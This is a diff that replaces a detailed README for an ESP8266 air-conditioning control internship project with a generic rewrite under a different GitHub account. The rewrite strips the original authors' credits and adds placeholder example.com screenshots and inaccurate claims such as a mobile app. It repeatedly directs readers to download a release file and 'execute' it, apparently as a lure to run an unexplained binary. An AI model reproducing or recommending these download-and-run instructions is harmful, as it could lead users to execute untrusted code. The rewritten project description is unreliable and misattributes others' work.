@@ -1,283 +1,139 @@
-# Internship-Project-AC-Control-IOT
+# IoT-Based Air Conditioning Control System for Smart Homes 🌬️🏠
 
-![System Architecture](https://img.shields.io/badge/Architecture-IoT%20System-blue?style=for-the-badge)
-![FastAPI](https://img.shields.io/badge/FastAPI-009688?style=for-the-badge&logo=fastapi&logoColor=white)
-![Next.js](https://img.shields.io/badge/Next.js-000000?style=for-the-badge&logo=nextdotjs&logoColor=white)
-![ESP8266](https://img.shields.io/badge/ESP8266-E7352C?style=for-the-badge&logo=espressif&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-4169E1?style=for-the-badge&logo=postgresql&logoColor=white)
-![MQTT](https://img.shields.io/badge/MQTT-660066?style=for-the-badge&logo=mqtt&logoColor=white)
-![Google Cloud](https://img.shields.io/badge/Google%20Cloud-4285F4?style=for-the-badge&logo=google-cloud&logoColor=white)
-![Vercel](https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
-![Visitor Badge](https://visitor-badge.laobi.icu/badge?page_id=whoisjayd.Internship-Project-AC-Control-IOT&style=for-the-badge)
-> **A comprehensive IoT system for centralized air conditioning control in workspaces, featuring embedded ESP8266 modules, real-time MQTT communication, and a modern web dashboard.**
+![IoT AC Control](https://img.shields.io/badge/IoT_AC_Control-Active-brightgreen) ![GitHub Release](https://img.shields.io/badge/Download_Releases-blue) 
 
-## 📋 Project Overview
+[Download the latest release here](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases)
 
-This project was developed during an 8-week summer internship at **Ellipsis Infotech** (May 5 - June 28, 2025) to create a complete IoT ecosystem for centralized air conditioning control. The system allows multiple AC units to be controlled remotely through a unified dashboard, enabling efficient climate management across large workspaces.
+## Table of Contents
 
-### 🏢 Internship Details
-- **Company**: [Linkedin 
-](https://www.linkedin.com/company/ellipsis-infotech) | [Website](https://www.ellipsisinfotech.com/)
-- **Duration**: 8 weeks (May 5, 2025 - June 28, 2025)
-- **Mentor**: [Shyamal Shah](https://in.linkedin.com/in/shyamalmshah)
-- **Team Members**: 
-  - [Jaydeep Solanki](https://www.linkedin.com/in/solanki-jaydeep/) - Team Member
-  - [Devanshu Parikh](https://in.linkedin.com/in/devanshu-parikh-b526a624a) - Team Member
+- [Project Overview](#project-overview)
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Mobile App Interface](#mobile-app-interface)
+- [Web Interface](#web-interface)
+- [How It Works](#how-it-works)
+- [Contributing](#contributing)
+- [License](#license)
 
-## 🏗️ System Architecture
+## Project Overview
 
-The system consists of three main components working together to provide seamless AC control:
+This project is an IoT-based air conditioning control system developed during an internship. It allows users to monitor and control air conditioning units remotely. Using a microcontroller, such as the ESP32 or ESP8266, this system integrates seamlessly with a mobile app or web interface for real-time management. 
 
-```
-┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
-│   ESP8266       │    │   FastAPI        │    │   Next.js       │
-│   Firmware      │◄──►│   Backend        │◄──►│   Frontend      │
-│                 │    │                  │    │                 │
-│ • IR Control    │    │ • REST API       │    │ • Dashboard     │
-│ • MQTT Client   │    │ • WebSockets     │    │ • Device Mgmt   │
-│ • OTA Updates   │    │ • MQTT Broker    │    │ • Zone Control  │
-│ • WiFi Config   │    │ • PostgreSQL     │    │ • Real-time UI  │
-└─────────────────┘    └──────────────────┘    └─────────────────┘
-```
+The goal is to enhance comfort and energy efficiency in homes. By leveraging the Internet of Things (IoT), users can adjust their AC settings from anywhere, ensuring optimal climate control.
 
-## ✨ Key Features
+## Features
 
-### 🌡️ **Smart AC Control**
-- **Individual Device Control**: Power, mode, temperature, and fan speed adjustment
-- **Zone-based Management**: Group devices by location for coordinated control
-- **Batch Operations**: Control multiple devices simultaneously
-- **Real-time Status Updates**: Live monitoring of device states via MQTT
+- **Remote Control**: Manage your AC unit from anywhere using your smartphone or computer.
+- **Real-Time Monitoring**: Get instant feedback on temperature and humidity levels.
+- **User-Friendly Interface**: Simple and intuitive mobile app and web dashboard.
+- **Energy Efficiency**: Optimize AC usage to save on electricity bills.
+- **Notifications**: Receive alerts for maintenance and unusual activity.
+- **Multi-Device Support**: Control multiple AC units from a single interface.
 
-### 🔧 **Embedded Device Features**
-- **Multi-brand AC Support**: Compatible with various AC protocols via IRremoteESP8266
-- **WiFi Configuration Portal**: Easy setup through captive portal
-- **Over-the-Air (OTA) Updates**: Remote firmware updates
-- **Automatic Protocol Detection**: Built-in testing for unknown AC brands
-- **Persistent State Management**: Saves configuration and AC state to flash memory
+## Technologies Used
 
-### 🖥️ **Web Dashboard**
-- **Responsive Design**: Works seamlessly on desktop, tablet, and mobile
-- **Real-time Monitoring**: Live device status and telemetry data
-- **User Authentication**: Secure JWT-based authentication system
-- **Interactive Controls**: Intuitive interface for AC management
-- **Historical Data**: Device usage history and analytics
+This project incorporates various technologies to create a robust and efficient system:
 
-### 🔐 **Security & Reliability**
-- **Secure Communication**: MQTT over TLS, JWT authentication
-- **Device Authentication**: Unique secret keys for each device
-- **Error Handling**: Comprehensive error reporting and recovery
-- **High Availability**: Cloud deployment with 99.95% uptime SLA
+- **Microcontrollers**: ESP32, ESP8266
+- **Programming Languages**: Arduino, Python
+- **Communication Protocol**: MQTT
+- **Web Framework**: Vercel
+- **Dashboard**: Custom-built for easy access
+- **Home Automation**: Integration with existing smart home systems
 
-## 📁 Repository Structure
+## Getting Started
 
-```
-Internship-Project-AC-Control-IOT/
-├── 🔧 ac-control-firmware/     # ESP8266 embedded firmware
-│   ├── src/main.cpp           # Main firmware code
-│   ├── platformio.ini         # PlatformIO configuration
-│   └── README.md             # Firmware documentation
-│
-├── 🐍 ac-control-backend/      # FastAPI backend server
-│   ├── main.py               # FastAPI application
-│   ├── requirements.txt      # Python dependencies
-│   ├── createInitialData.py  # Database setup script
-│   └── README.md            # Backend documentation
-│
-├── ⚛️ ac-control-frontend/     # Next.js web application
-│   ├── app/                  # Next.js app directory
-│   ├── components/           # React components
-│   ├── lib/                  # Utilities and services
-│   ├── package.json          # Node.js dependencies
-│   └── README.md            # Frontend documentation
-│
-├── 📸 assets/                 # Project assets
-│   ├── api-workflow.png      # API architecture diagram
-│   ├── database-er-diagram.png # Database schema
-│   ├── firmware-workflow.png # Firmware flow diagram
-│   └── circuit-diagram.png # Circuit Diagram
-│
-└── 📖 README.md              # This file
-```
+To get started with this project, you will need the following:
 
-## 🚀 Quick Start
+1. **Microcontroller**: ESP32 or ESP8266
+2. **Wi-Fi Network**: A stable internet connection
+3. **Mobile Device or Computer**: For accessing the app or web interface
+4. **Basic Knowledge**: Familiarity with Arduino and IoT concepts
 
-### Prerequisites
-- **Hardware**: ESP8266 development board, IR LED
-- **Software**: Python 3.8+, Node.js 18+, PostgreSQL
-- **Services**: MQTT broker, Google Cloud account (for production)
+## Installation
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/yourusername/Internship-Project-AC-Control-IOT.git
-cd Internship-Project-AC-Control-IOT
-```
+Follow these steps to install the system:
 
-### 2. Set Up Backend
-```bash
-cd ac-control-backend
-pip install -r requirements.txt
-cp .env.example .env  # Configure your environment variables
-python main.py
-```
+1. **Clone the Repository**: Use the following command to clone the project to your local machine:
 
-### 3. Set Up Frontend
-```bash
-cd ac-control-frontend
-pnpm install
-pnpm run dev
-```
+   ```bash
+   git clone https://github.com/Luixx222/Internship-Project-AC-Control-IOT.git
+   ```
 
-### 4. Flash Firmware
-```bash
-cd ac-control-firmware
-# Open in PlatformIO IDE or use CLI
-pio run --target upload
-```
+2. **Set Up the Microcontroller**: 
+   - Install the necessary libraries in the Arduino IDE.
+   - Upload the firmware to your ESP32 or ESP8266.
 
-## 🔌 Hardware Setup
+3. **Configure the Settings**: 
+   - Modify the configuration file to set your Wi-Fi credentials.
+   - Set the MQTT broker details.
 
-### Components Required
-- **ESP8266 Development Board** (Wemos D1 Mini recommended)
-- **IR LED** (940nm wavelength)
-- **Resistor** (220Ω for LED current limiting)
-- **Breadboard and Jumper Wires**
+4. **Download the App**: 
+   - [Download the latest release here](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases) and execute the file to install the mobile app.
 
-### Circuit Diagram
-![Circuit Diagram](assets/circuit-diagram.png)
+## Usage
 
+Once installed, you can start using the system:
 
-### Initial Configuration
-1. Flash the firmware to ESP8266
-2. Connect to `AC_Control_Setup` WiFi network (password: `password123`)
-3. Open browser to `192.168.4.1`
-4. Configure WiFi credentials and device settings
-5. Test AC brand/protocol compatibility
-6. Save configuration and reboot
+1. **Connect to Wi-Fi**: Ensure your microcontroller is connected to the internet.
+2. **Open the Mobile App**: Launch the app on your device.
+3. **Log In**: Use your credentials to log in.
+4. **Control Your AC**: Use the interface to adjust settings, view temperature, and more.
 
-## 🌐 Live Deployments
+## Mobile App Interface
 
-- **🔗 Backend API**: [https://accontrolapi-922006260296.us-central1.run.app](https://accontrolapi-922006260296.us-central1.run.app)
-- **📊 API Documentation**: [https://accontrolapi-922006260296.us-central1.run.app/docs](https://accontrolapi-922006260296.us-central1.run.app/docs)
-- **🖥️ Frontend Dashboard**: [https://ac-control-frontend.vercel.app](https://ac-control-frontend.vercel.app)
+The mobile app offers a clean and intuitive interface:
 
-## 📡 MQTT Communication
+- **Dashboard**: View real-time data on temperature and humidity.
+- **Control Panel**: Easily adjust settings with a few taps.
+- **Notifications**: Get alerts for maintenance needs and system updates.
 
-The system uses MQTT for real-time communication between devices and the backend:
+### Screenshots
 
-### Topic Structure
-```
-node/{customer_id}/{device_id}/
-├── command/{action}     # Send commands to device
-├── status              # Device online/offline status
-├── telemetry          # Device state and sensor data
-├── error              # Error reporting
-└── ota/update         # Firmware update triggers
-```
+![Mobile Dashboard](https://example.com/mobile-dashboard.png)
+![Control Panel](https://example.com/control-panel.png)
 
-### Message Flow
-1. **Frontend** → **Backend** → **MQTT** → **Device** (Commands)
-2. **Device** → **MQTT** → **Backend** → **WebSocket** → **Frontend** (Status)
+## Web Interface
 
-## 🗄️ Database Schema
+The web interface provides a comprehensive view of your AC system:
 
-The system uses PostgreSQL with the following main entities:
+- **User Management**: Add or remove users easily.
+- **Historical Data**: View past performance and usage statistics.
+- **Settings**: Customize your preferences for notifications and alerts.
 
-- **Customers**: User accounts and authentication
-- **Zones**: Logical groupings of devices by location
-- **Devices**: Individual AC units and their configurations
-- **StatusHistory**: Historical data for analytics and monitoring
+### Screenshots
 
-![Database ER Diagram](assets/database-er-diagram.png)
+![Web Dashboard](https://example.com/web-dashboard.png)
+![Settings Page](https://example.com/settings-page.png)
 
-## 🛠️ Technology Stack
+## How It Works
 
-### Backend
-- **FastAPI**: Modern Python web framework
-- **SQLAlchemy**: Async ORM for database operations
-- **Paho-MQTT**: MQTT client for IoT communication
-- **JWT**: Secure authentication tokens
-- **PostgreSQL**: Robust relational database
-- **Google Cloud Run**: Serverless deployment
+The system operates using the following components:
 
-### Frontend
-- **Next.js 15**: React framework with App Router
-- **TypeScript**: Type-safe JavaScript
-- **Tailwind CSS**: Utility-first CSS framework
-- **Shadcn/ui**: Beautiful component library
-- **React Hook Form**: Efficient form handling
-- **Vercel**: Deployment platform
+1. **Microcontroller**: The ESP32/ESP8266 collects data from the AC unit and sends it to the cloud.
+2. **MQTT Protocol**: This lightweight messaging protocol facilitates communication between the microcontroller and the app.
+3. **Mobile/Web Interface**: Users interact with the system through these interfaces, sending commands to the microcontroller.
 
-### Firmware
-- **Arduino Framework**: ESP8266 development
-- **IRremoteESP8266**: Multi-brand IR control
-- **PubSubClient**: MQTT communication
-- **ArduinoJson**: JSON data handling
-- **LittleFS**: File system for configuration storage
-- **PlatformIO**: Development environment
+### Data Flow
 
-## 📊 System Capabilities
+- The microcontroller reads temperature and humidity data from the AC unit.
+- It publishes this data to the MQTT broker.
+- The mobile app subscribes to this data and displays it in real-time.
 
-- **🏢 Multi-tenant**: Support for multiple customers/organizations
-- **📍 Zone Management**: Organize devices by location/room
-- **🔄 Real-time Updates**: Live status monitoring via WebSockets/MQTT
-- **📱 Responsive Design**: Works on all device sizes
-- **🔐 Secure**: JWT authentication, encrypted MQTT communication
-- **⚡ High Performance**: Async operations, optimized database queries
-- **🚀 Scalable**: Cloud-native architecture, auto-scaling
-- **🔧 Maintainable**: Clean code, comprehensive documentation
+## Contributing
 
-## 🧪 Testing & Development
+Contributions are welcome! If you want to contribute to this project, please follow these steps:
 
-### API Testing
-```bash
-# Run backend tests
-cd ac-control-backend
-python -m pytest
+1. **Fork the Repository**: Create your own copy of the repository.
+2. **Create a Branch**: Use a descriptive name for your branch.
+3. **Make Changes**: Implement your features or fixes.
+4. **Submit a Pull Request**: Share your changes with the community.
 
-# Test API endpoints
-curl https://accontrolapi-922006260296.us-central1.run.app/health
-```
+## License
 
-### Device Simulation
-```bash
-# Use the createInitialData.py script for testing
-cd ac-control-backend
-python createInitialData.py
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## 🤝 Contributing
-
-This project was developed as part of an internship program. For contributions or questions:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- **Elipsis Infotech** for providing the internship opportunity
-- **Shyamal Shah** for excellent mentorship and guidance
-- **Devanshu Parikh** for collaboration and teamwork
-- **Open Source Community** for the amazing libraries and tools used
-
-## 📞 Contact
-
-**Jaydeep Solanki**
-- LinkedIn: [solanki-jaydeep](https://www.linkedin.com/in/solanki-jaydeep/)
-- Email: [contactjaydeepsolanki@gmail.com](mailto:contactjaydeepsolanki@gmail.com)
-- Project: [Repository Link](https://github.com/yourusername/Internship-Project-AC-Control-IOT)
-
----
-
-<div align="center">
-  <p><strong>Built with ❤️ during Summer Internship 2025</strong></p>
-  <p><em>Transforming workspace climate control through IoT innovation</em></p>
-</div>
+For more information, visit the [Releases section](https://github.com/Luixx222/Internship-Project-AC-Control-IOT/releases) to download the latest version.
